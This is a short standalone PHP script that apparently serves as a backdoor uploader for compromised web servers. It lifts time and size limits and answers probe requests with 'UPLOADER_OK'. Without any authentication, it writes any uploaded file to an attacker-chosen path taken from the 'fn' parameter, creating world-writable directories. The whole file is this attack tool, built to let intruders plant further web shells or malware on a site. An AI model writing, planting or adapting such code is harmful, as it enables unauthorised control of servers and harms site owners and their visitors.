<?php
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('set_time_limit',0);
@ini_set('upload_max_filesize','8000000');
@ini_set('post_max_size','8000000');
error_reporting(E_ALL);
ignore_user_abort(true);

function return_bytes($val) {
    $val = trim($val);
    $last = strtolower($val[strlen($val)-1]);
    switch($last) {
        // The 'G' modifier is available since PHP 5.1.0
        case 'g':
            $val *= 1024;
        case 'm':
            $val *= 1024;
        case 'k':
            $val *= 1024;
    }

    return $val;
}


if(isset($_POST['check']) && $_POST['check']=="1"){
	echo "UPLOADER_OK";return;
}

if(isset($_POST['get_max_size']) && $_POST['get_max_size']=="1"){
	echo "<start>MAX_SIZE=" . min(return_bytes(ini_get('post_max_size')), return_bytes(ini_get('upload_max_filesize'))) . "</start>";return;
}


if((isset($_FILES['file']))&&(isset($_GET['fn'])))
{
	$fn = $_GET['fn'];
	$rp=strrpos($fn,'/');
	if($rp!==false)
	{
		$dir = substr($fn,0,$rp);
		if(!file_exists($dir))mkdir($dir, 0777, true);
	}
	
	echo "###UNPK### ";
	echo @copy($_FILES['file']['tmp_name'],$fn) ? 'UPLOADER_OK' : 'ERR';
	echo "###UNPKEND###";
}
?>